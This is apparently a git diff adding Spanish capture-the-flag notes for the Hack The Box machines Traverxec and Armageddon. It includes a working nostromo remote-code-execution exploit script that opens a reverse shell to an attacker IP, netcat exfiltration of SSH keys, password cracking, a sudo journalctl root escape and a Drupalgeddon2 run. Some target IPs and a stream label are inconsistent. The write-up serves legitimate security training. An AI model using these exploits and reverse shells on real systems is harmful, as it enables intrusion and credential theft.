@@ -119,7 +119,7 @@
 \title{2021 - S4viNotes}
 \author{Lo0pInG 404}
 % The month and year that you submit your FINAL draft TO THE LIBRARY (May or December)
-\date{updated on 2021-07-23}
+\date{updated on 2021-07-24}
 \division{}
 \unitname{}{}{}
 \advisor{}
@@ -456,7 +456,7 @@ Checkeamos si existe un exploit relacionado con \textbf{Xdebug 2.5.5}
 \end{Highlighting}
 \end{Shaded}
 
-Hay un script en Ruby (Metasploit) que permitiria hacer execucion de commandos. Analizando el exploit con el commando
+Hay un script en Ruby (Metasploit) que permitiria hacer execucion de commandos. Analizamos el exploit con el commando
 
 \begin{Shaded}
 \begin{Highlighting}[]
@@ -916,6 +916,551 @@ Ya es sufficiente aqui porque ya se puede ver quel usuario esta en el grupo Dock
 \end{Shaded}
   \end{itemize}
 \end{enumerate}
+
+\hypertarget{traverxec}{%
+\chapter*{Traverxec}\label{traverxec}}
+\addcontentsline{toc}{chapter}{Traverxec}
+
+\hypertarget{introduccion-1}{%
+\section*{Introduccion}\label{introduccion-1}}
+\addcontentsline{toc}{section}{Introduccion}
+
+La maquina del dia 23/07/2021 se llama Traverxec.
+
+El replay del live se puede ver en \href{https://www.twitch.tv/videos/1095841567}{Twitch: S4vitaar Traverxec maquina}
+
+\hypertarget{enumeracion-1}{%
+\section*{Enumeracion}\label{enumeracion-1}}
+\addcontentsline{toc}{section}{Enumeracion}
+
+\hypertarget{reconocimiento-de-maquina-puertos-abiertos-y-servicios-1}{%
+\subsection*{Reconocimiento de maquina, puertos abiertos y servicios}\label{reconocimiento-de-maquina-puertos-abiertos-y-servicios-1}}
+\addcontentsline{toc}{subsection}{Reconocimiento de maquina, puertos abiertos y servicios}
+
+\hypertarget{ping-1}{%
+\subsubsection*{Ping}\label{ping-1}}
+\addcontentsline{toc}{subsubsection}{Ping}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{ping}\NormalTok{ -c 1 10.10.10.165}
+\end{Highlighting}
+\end{Shaded}
+
+ttl: 63 -\textgreater{} maquina linux
+
+\hypertarget{nmap-1}{%
+\subsubsection*{Nmap}\label{nmap-1}}
+\addcontentsline{toc}{subsubsection}{Nmap}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{nmap}\NormalTok{ -p- --open -T5 -v -n 10.10.10.165}
+\end{Highlighting}
+\end{Shaded}
+
+Va un poquito lento\ldots{}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{nmap}\NormalTok{ -p- -sS --min-rate 5000 --open -vvv -n -Pn 10.10.10.165 -oG allPorts}
+\ExtensionTok{extractPorts}\NormalTok{ allPorts}
+\FunctionTok{nmap}\NormalTok{ -sC -sV -p 10.10.10.165 -oN targeted}
+\end{Highlighting}
+\end{Shaded}
+
+\begin{longtable}[]{@{}llll@{}}
+\toprule
+Puerto & Servicio & Que se nos occure? & Que falta?\tabularnewline
+\midrule
+\endhead
+22 & ssh & conneccion a la maquina & Usuario contraseña\tabularnewline
+80 & http & whatweb, http-enum & Checkear la web\tabularnewline
+\bottomrule
+\end{longtable}
+
+\hypertarget{empezamos-por-el-puerto-80-1}{%
+\subsection*{Empezamos por el puerto 80}\label{empezamos-por-el-puerto-80-1}}
+\addcontentsline{toc}{subsection}{Empezamos por el puerto 80}
+
+\hypertarget{whatweb-1}{%
+\subsubsection*{Whatweb}\label{whatweb-1}}
+\addcontentsline{toc}{subsubsection}{Whatweb}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{whatweb}\NormalTok{ http://10.10.10.165}
+\end{Highlighting}
+\end{Shaded}
+
+\begin{itemize}
+\tightlist
+\item
+  nostromo 1.9.6
+\end{itemize}
+
+\hypertarget{checkear-la-cabezera}{%
+\subsubsection*{Checkear la cabezera}\label{checkear-la-cabezera}}
+\addcontentsline{toc}{subsubsection}{Checkear la cabezera}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{curl}\NormalTok{ -s -X GET -I http://10.10.10.165}
+\end{Highlighting}
+\end{Shaded}
+
+\begin{itemize}
+\tightlist
+\item
+  nostromo 1.9.6
+\end{itemize}
+
+\hypertarget{browsear-la-web-1}{%
+\subsubsection*{Browsear la web}\label{browsear-la-web-1}}
+\addcontentsline{toc}{subsubsection}{Browsear la web}
+
+Nada interessante.
+
+\hypertarget{wfuzz-1}{%
+\subsubsection*{WFuzz}\label{wfuzz-1}}
+\addcontentsline{toc}{subsubsection}{WFuzz}
+
+Como no hay mucho mas que ver, applicaremos \textbf{fuzzing} para descubrir si hay mas rutas.
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{wfuzz}\NormalTok{ -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.233/FUZZ}
+\end{Highlighting}
+\end{Shaded}
+
+No hay nada, creamos un fichero de extensiones txt, php, html y fuzzeamos otravez.
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{wfuzz}\NormalTok{ -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -w extensions http://10.10.10.233/FUZZ.FUZ2Z}
+\end{Highlighting}
+\end{Shaded}
+
+No hay nada.
+
+\hypertarget{vulnerability-assessment-1}{%
+\section*{Vulnerability Assessment}\label{vulnerability-assessment-1}}
+\addcontentsline{toc}{section}{Vulnerability Assessment}
+
+\hypertarget{searchsploit-1}{%
+\subsection*{searchsploit}\label{searchsploit-1}}
+\addcontentsline{toc}{subsection}{searchsploit}
+
+Checkeamos si existe un exploit relacionado con \textbf{nostromo 1.9.6}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{searchsploit}\NormalTok{ nostromo }
+\end{Highlighting}
+\end{Shaded}
+
+Hay un script en Python que permitiria hacer execucion de commandos. Nos traemos el script en el repertorio de trabajo.
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{searchsploit}\NormalTok{ -m 47837}
+\FunctionTok{mv}\NormalTok{ 47837.py nostromo_exploit.py}
+\end{Highlighting}
+\end{Shaded}
+
+Analizando el script con \texttt{cat}, vemos como se uza el exploit. Intentamos reproduzir los passos antes de crearnos nuestro
+proprio script.
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  En una terminal
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{nc}\NormalTok{ -nlvp 443}
+\end{Highlighting}
+\end{Shaded}
+\item
+  En otra terminal
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{telnet}\NormalTok{ 10.10.10.165 80}
+\ExtensionTok{POST}\NormalTok{ /.%0d./.%0d./.%0d./.%0d./bin/sh HTTP/1.0}
+\ExtensionTok{Content-Length}\NormalTok{: 1}
+
+\FunctionTok{whoami} \KeywordTok{|} \ExtensionTok{nc}\NormalTok{ 10.10.14.20 443}
+\end{Highlighting}
+\end{Shaded}
+\end{enumerate}
+
+Se ve \texttt{www-data} en la primera terminal.
+
+Ya podemos crearnos el script.
+
+\hypertarget{vuln-exploit-gaining-access-1}{%
+\section*{Vuln exploit \& Gaining Access}\label{vuln-exploit-gaining-access-1}}
+\addcontentsline{toc}{section}{Vuln exploit \& Gaining Access}
+
+\hypertarget{autopwn.py}{%
+\subsection*{Autopwn.py}\label{autopwn.py}}
+\addcontentsline{toc}{subsection}{Autopwn.py}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\CommentTok{#!/usr/bin/python3}
+
+\ImportTok{import}\NormalTok{ requests}
+\ImportTok{import}\NormalTok{ sys}
+\ImportTok{import}\NormalTok{ signal}
+\ImportTok{import}\NormalTok{ pdb}
+\ImportTok{import}\NormalTok{ threading}
+\ImportTok{import}\NormalTok{ time}
+
+\ImportTok{from}\NormalTok{ pwn }\ImportTok{import} \OperatorTok{*}
+
+\KeywordTok{def}\NormalTok{ def_handler(sig, frame):}
+    \BuiltInTok{print}\NormalTok{(}\StringTok{"}\CharTok{\textbackslash{}n}\StringTok{[!] Saliendo...}\CharTok{\textbackslash{}n}\StringTok{"}\NormalTok{)}
+\NormalTok{    sys.exit(}\DecValTok{1}\NormalTok{)}
+
+\CommentTok{# Ctrl+C}
+\NormalTok{signal.signal(signal.SIGINT, def_handler)}
+
+\CommentTok{# Variables globales}
+\NormalTok{main_url }\OperatorTok{=} \StringTok{"http://10.10.10.165/.}\SpecialCharTok{%0d}\StringTok{./.}\SpecialCharTok{%0d}\StringTok{./.}\SpecialCharTok{%0d}\StringTok{./.}\SpecialCharTok{%0d}\StringTok{./bin/sh"}
+\NormalTok{lport }\OperatorTok{=} \DecValTok{443}
+
+\KeywordTok{def}\NormalTok{ makeRequest():}
+
+\NormalTok{    data_post }\OperatorTok{=}\NormalTok{ \{}
+\NormalTok{        b}\StringTok{'bash -c "bash -i >& /dev/tcp/10.10.14.20/443 0>&1"'}
+\NormalTok{    \}}
+
+\NormalTok{    r }\OperatorTok{=}\NormalTok{ requests.post(main_url, data}\OperatorTok{=}\NormalTok{data_post)}
+
+\ControlFlowTok{if} \VariableTok{__name__} \OperatorTok{==} \StringTok{'__main__'}\NormalTok{:}
+
+    \ControlFlowTok{try}\NormalTok{:}
+\NormalTok{        threading.Thread(target}\OperatorTok{=}\NormalTok{makeRequest, args}\OperatorTok{=}\NormalTok{()).start()}
+    \ControlFlowTok{except} \PreprocessorTok{Exception} \ImportTok{as}\NormalTok{ e:}
+\NormalTok{        log.error(}\BuiltInTok{str}\NormalTok{(e))}
+
+\NormalTok{    p1 }\OperatorTok{=}\NormalTok{ log.progress(}\StringTok{"Acceso"}\NormalTok{)}
+\NormalTok{    p1.status(}\StringTok{"Ganando acceso al sistema"}\NormalTok{)}
+
+\NormalTok{    shell }\OperatorTok{=}\NormalTok{ listen(lport, timeout}\OperatorTok{=}\DecValTok{5}\NormalTok{).wait_for_connection()}
+
+    \ControlFlowTok{if}\NormalTok{ shell.sock }\KeywordTok{is} \VariableTok{None}\NormalTok{:}
+\NormalTok{        p1.failure(}\StringTok{"No ha sido posible ganar acceso al sistema"}\NormalTok{)}
+\NormalTok{        sys.exit(}\DecValTok{1}\NormalTok{)}
+    \ControlFlowTok{else}\NormalTok{:}
+\NormalTok{        shell.interactive()}
+\end{Highlighting}
+\end{Shaded}
+
+Lo ejecutamos
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{python}\NormalTok{ autopwn.py}
+\FunctionTok{whoami}
+\CommentTok{#Output}
+\ExtensionTok{www-data}
+
+\ExtensionTok{ifconfig}
+\end{Highlighting}
+\end{Shaded}
+
+El tito prefiere entablarse una shell normal. Se pone en escucha con \texttt{nc\ -nlvp\ 443} y lanza en la shell creado por el script
+\texttt{bash\ -i\ \textgreater{}\&\ /dev/tcp/10.10.14.20/443\ 0\textgreater{}\&1}
+
+\hypertarget{tratamiento-de-la-tty-1}{%
+\subsection*{Tratamiento de la TTY}\label{tratamiento-de-la-tty-1}}
+\addcontentsline{toc}{subsection}{Tratamiento de la TTY}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{script}\NormalTok{ /dev/null -c bash}
+\NormalTok{^}\ExtensionTok{Z}
+\FunctionTok{stty}\NormalTok{ raw -echo}\KeywordTok{;} \BuiltInTok{fg}
+\ExtensionTok{-}\OperatorTok{>}\NormalTok{ reset}
+\ExtensionTok{-}\OperatorTok{>}\NormalTok{ xterm}
+\BuiltInTok{export} \VariableTok{TERM=}\NormalTok{xterm}
+\BuiltInTok{export} \VariableTok{SHELL=}\NormalTok{bash}
+
+\FunctionTok{stty}\NormalTok{ -a}
+
+\FunctionTok{stty}\NormalTok{ rows }\OperatorTok{<}\NormalTok{rownb}\OperatorTok{>}\NormalTok{ columns }\OperatorTok{<}\NormalTok{colnb}\OperatorTok{>}
+\end{Highlighting}
+\end{Shaded}
+
+\hypertarget{privilege-escalation-1}{%
+\section*{Privilege Escalation}\label{privilege-escalation-1}}
+\addcontentsline{toc}{section}{Privilege Escalation}
+
+\hypertarget{enumeracion-del-usuario-en-la-maquina-victima-1}{%
+\subsection*{Enumeracion del usuario en la maquina victima}\label{enumeracion-del-usuario-en-la-maquina-victima-1}}
+\addcontentsline{toc}{subsection}{Enumeracion del usuario en la maquina victima}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\BuiltInTok{cd}\NormalTok{ /home}
+\CommentTok{#Output}
+\ExtensionTok{david}
+
+\FunctionTok{ls}\NormalTok{ /home/david}
+\CommentTok{#Output}
+\ExtensionTok{Permisson}\NormalTok{ denied}
+
+\FunctionTok{ls}\NormalTok{ -l /home}
+\CommentTok{#Output}
+\ExtensionTok{drwx--x--x}
+\end{Highlighting}
+\end{Shaded}
+
+Enumeramos el systema
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\BuiltInTok{cd}\NormalTok{ /}
+\FunctionTok{id}
+\FunctionTok{sudo}\NormalTok{ -l}
+\FunctionTok{find}\NormalTok{ \textbackslash{}-perm -4000 }\OperatorTok{2>}\NormalTok{/dev/null}
+\BuiltInTok{cd}\NormalTok{ /var}
+\FunctionTok{ls}
+\BuiltInTok{cd}\NormalTok{ nostromo}
+\BuiltInTok{cd}\NormalTok{ conf}
+\FunctionTok{cat}\NormalTok{ nhttpd.conf}
+\FunctionTok{cat}\NormalTok{ /var/nostromo/conf/.htpasswd}
+\end{Highlighting}
+\end{Shaded}
+
+Encontramos el hash del usuario david vamos a copiarlo en la maquina de attackante, y intentamos bruteforcear con \textbf{John}
+
+\hypertarget{john}{%
+\subsection*{John}\label{john}}
+\addcontentsline{toc}{subsection}{John}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{john}\NormalTok{ --wordlist=/usr/share/wordlists/rockyou.txt hash}
+\end{Highlighting}
+\end{Shaded}
+
+Encontramos una contraseña intentamos ponerla aciendo un \texttt{su\ david} y \texttt{su\ root}, pero no va. La conclusion a la que hay que llegar
+es que cuando miras el fichero nhttpd.conf, dice que hay un directorio \textbf{public\_www}.
+
+\hypertarget{investigacion-del-public_www}{%
+\subsection*{Investigacion del public\_www}\label{investigacion-del-public_www}}
+\addcontentsline{toc}{subsection}{Investigacion del public\_www}
+
+Intentamos ver si esta en el directorio \texttt{/home/david/public\_www} y effectivamente. hay un fichero comprimido y nos vamos a transferir
+a nuestro equipo de attaquante.
+
+\begin{enumerate}
+\def\labelenumi{\arabic{enumi}.}
+\item
+  En el equipo de attaquante
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{nc}\NormalTok{ -nlvp 443 }\OperatorTok{>}\NormalTok{ comprimido.tgz}
+\end{Highlighting}
+\end{Shaded}
+\item
+  En el equipo victima
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{nc}\NormalTok{ 10.10.14.20 443 }\OperatorTok{<}\NormalTok{ backup-ssh-identity-files.tgz}
+\end{Highlighting}
+\end{Shaded}
+\end{enumerate}
+
+Descomprimimos el archivo con el commando
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{7z}\NormalTok{ l comprimido.tgz}
+\ExtensionTok{7z}\NormalTok{ x comprimido.tgz}
+\ExtensionTok{7z}\NormalTok{ l comprimido.tar}
+\ExtensionTok{7z}\NormalTok{ x comprimido.tar }
+\end{Highlighting}
+\end{Shaded}
+
+Hay la clave privado del usuario david pero esta protegida por contraseña. La tenemos que romper.
+
+\hypertarget{ssh2john}{%
+\subsection*{ssh2john}\label{ssh2john}}
+\addcontentsline{toc}{subsection}{ssh2john}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{ssh2john.py}\NormalTok{ id_rsa }\OperatorTok{>}\NormalTok{ hash}
+\ExtensionTok{john}\NormalTok{ --wordlist=/usr/share/wordlists/rockyou.txt hash}
+\end{Highlighting}
+\end{Shaded}
+
+La contraseña de la id\_rsa a sido crackeada y ya nos podemos connectar con ssh
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{ssh}\NormalTok{ -i id_rsa david@10.10.10.165 }
+\end{Highlighting}
+\end{Shaded}
+
+\hypertarget{escalada-de-privilegio-para-root}{%
+\subsection*{Escalada de privilegio para root}\label{escalada-de-privilegio-para-root}}
+\addcontentsline{toc}{subsection}{Escalada de privilegio para root}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{ls}\NormalTok{ -l}
+\CommentTok{#Output}
+\ExtensionTok{bin}
+
+\BuiltInTok{cd}\NormalTok{ bin/}
+\FunctionTok{cat}\NormalTok{ server-stats.sh}
+\end{Highlighting}
+\end{Shaded}
+
+Vemos en este fichero que sudo puede executar \textbf{journalctl}
+
+Vamos a la pagina de \href{gtfobins.github.io}{gtfobins} y buscamos por jounalctl
+
+El \textbf{gtfobins} dice que hay que lanzar jounalctl con sudo y en otra linea poner \texttt{!/bin/sh}
+
+\begin{quote}
+{[}!{]} NOTA: cuando pone ! en otra linea quiere decir que hay que ejecutarlo en modo less. O sea hay que reducir la terminal para que se pueda introducir un nuevo commando. En este caso !/bin/sh
+\end{quote}
+
+Ya estamos root y seguimos mas hack que nunca.
+
+\hypertarget{armageddon}{%
+\chapter*{Armageddon}\label{armageddon}}
+\addcontentsline{toc}{chapter}{Armageddon}
+
+\hypertarget{introduccion-2}{%
+\section*{Introduccion}\label{introduccion-2}}
+\addcontentsline{toc}{section}{Introduccion}
+
+La maquina del dia 22/07/2021 se llama Armageddon.
+
+El replay del live se puede ver en \href{https://www.twitch.tv/videos/1094808182}{Twitch: S4vitaar Olympus maquina}
+
+\hypertarget{enumeracion-2}{%
+\section*{Enumeracion}\label{enumeracion-2}}
+\addcontentsline{toc}{section}{Enumeracion}
+
+\hypertarget{reconocimiento-de-maquina-puertos-abiertos-y-servicios-2}{%
+\subsection*{Reconocimiento de maquina, puertos abiertos y servicios}\label{reconocimiento-de-maquina-puertos-abiertos-y-servicios-2}}
+\addcontentsline{toc}{subsection}{Reconocimiento de maquina, puertos abiertos y servicios}
+
+\hypertarget{ping-2}{%
+\subsubsection*{Ping}\label{ping-2}}
+\addcontentsline{toc}{subsubsection}{Ping}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{ping}\NormalTok{ -c 1 10.10.10.233}
+\end{Highlighting}
+\end{Shaded}
+
+ttl: 63 -\textgreater{} maquina linux
+
+\hypertarget{nmap-2}{%
+\subsubsection*{Nmap}\label{nmap-2}}
+\addcontentsline{toc}{subsubsection}{Nmap}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{nmap}\NormalTok{ -p- --open -T5 -v -n 10.10.10.233 -oG allPorts}
+\ExtensionTok{extractPorts}\NormalTok{ allPorts}
+\FunctionTok{nmap}\NormalTok{ -sC -sV -p53,80,2222 10.10.10.83 -oN targeted}
+\end{Highlighting}
+\end{Shaded}
+
+\begin{longtable}[]{@{}llll@{}}
+\toprule
+Puerto & Servicio & Que se nos occure? & Que falta?\tabularnewline
+\midrule
+\endhead
+22 & ssh & Accesso directo & usuario y contraseña\tabularnewline
+80 & http & Drupal-armageddon (drupalgeddon) & Checkear el exploit\tabularnewline
+\bottomrule
+\end{longtable}
+
+\hypertarget{vulnerability-assessment-2}{%
+\section*{Vulnerability Assessment}\label{vulnerability-assessment-2}}
+\addcontentsline{toc}{section}{Vulnerability Assessment}
+
+\hypertarget{druppalgeddon}{%
+\subsection*{Druppalgeddon}\label{druppalgeddon}}
+\addcontentsline{toc}{subsection}{Druppalgeddon}
+
+\textbf{Druppalgeddon2} es un exploit creado por Hans Topo y g0tmi1k escrito en ruby.
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{ruby}\NormalTok{ drupalggedon2.rb 10.10.10.233}
+\end{Highlighting}
+\end{Shaded}
+
+\hypertarget{vuln-exploit-gaining-access-2}{%
+\section*{Vuln exploit \& Gaining Access}\label{vuln-exploit-gaining-access-2}}
+\addcontentsline{toc}{section}{Vuln exploit \& Gaining Access}
+
+\hypertarget{tratamiento-de-la-tty-2}{%
+\subsection*{Tratamiento de la TTY}\label{tratamiento-de-la-tty-2}}
+\addcontentsline{toc}{subsection}{Tratamiento de la TTY}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\ExtensionTok{script}\NormalTok{ /dev/null -c bash}
+\NormalTok{^}\ExtensionTok{Z}
+\FunctionTok{stty}\NormalTok{ raw -echo}\KeywordTok{;} \BuiltInTok{fg}
+\ExtensionTok{-}\OperatorTok{>}\NormalTok{ reset}
+\ExtensionTok{-}\OperatorTok{>}\NormalTok{ xterm}
+\BuiltInTok{export} \VariableTok{TERM=}\NormalTok{xterm}
+\BuiltInTok{export} \VariableTok{SHELL=}\NormalTok{bash}
+
+\FunctionTok{stty}\NormalTok{ -a}
+
+\FunctionTok{stty}\NormalTok{ rows }\OperatorTok{<}\NormalTok{rownb}\OperatorTok{>}\NormalTok{ columns }\OperatorTok{<}\NormalTok{colnb}\OperatorTok{>}
+\end{Highlighting}
+\end{Shaded}
+
+\hypertarget{investigamos-la-maquina-1}{%
+\subsection*{Investigamos la maquina}\label{investigamos-la-maquina-1}}
+\addcontentsline{toc}{subsection}{Investigamos la maquina}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\BuiltInTok{cd}\NormalTok{ /home}
+\CommentTok{#Output}
+\ExtensionTok{zeus}
+
+\FunctionTok{ls}\NormalTok{ /home/zeus}
+\CommentTok{#Output}
+\ExtensionTok{airgeddon}
+\end{Highlighting}
+\end{Shaded}
+
+\hypertarget{privilege-escalation-2}{%
+\section*{Privilege Escalation}\label{privilege-escalation-2}}
+\addcontentsline{toc}{section}{Privilege Escalation}
+
+\hypertarget{enumeracion-del-usuario-en-la-maquina-victima-2}{%
+\subsection*{Enumeracion del usuario en la maquina victima}\label{enumeracion-del-usuario-en-la-maquina-victima-2}}
+\addcontentsline{toc}{subsection}{Enumeracion del usuario en la maquina victima}
+
+\begin{Shaded}
+\begin{Highlighting}[]
+\FunctionTok{whoami}
+\FunctionTok{id}
+\end{Highlighting}
+\end{Shaded}
 
 
 % Index?
